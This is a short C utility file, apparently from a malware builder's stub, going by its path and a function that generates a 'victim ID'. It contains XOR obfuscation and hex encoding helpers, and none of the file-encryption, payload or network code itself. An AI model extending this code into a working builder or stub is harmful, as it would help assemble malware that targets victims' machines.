/* builder/stub/util.c */
#include "util.h"
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

void xor_buf(unsigned char *buf, size_t n, unsigned char key) {
    for (size_t i = 0; i < n; i++) buf[i] ^= key;
}

static const char HEX[] = "0123456789abcdef";

void hex_encode(const unsigned char *in, size_t n, char *out) {
    for (size_t i = 0; i < n; i++) {
        out[i*2]   = HEX[in[i] >> 4];
        out[i*2+1] = HEX[in[i] & 0xF];
    }
    out[n*2] = 0;
}

int hex_decode(const char *in, unsigned char *out, size_t out_cap) {
    size_t len = strlen(in);
    if (len % 2 || len/2 > out_cap) return -1;
    for (size_t i = 0; i < len; i += 2) {
        int hi = in[i]   <= '9' ? in[i]-'0'   : (in[i]|32)-'a'+10;
        int lo = in[i+1] <= '9' ? in[i+1]-'0' : (in[i+1]|32)-'a'+10;
        out[i/2] = (unsigned char)((hi<<4)|lo);
    }
    return (int)(len/2);
}

void make_victim_id(char *out, size_t cap) {
    unsigned char r[8];
    BCryptGenRandom(NULL, r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    hex_encode(r, sizeof(r), out);
}
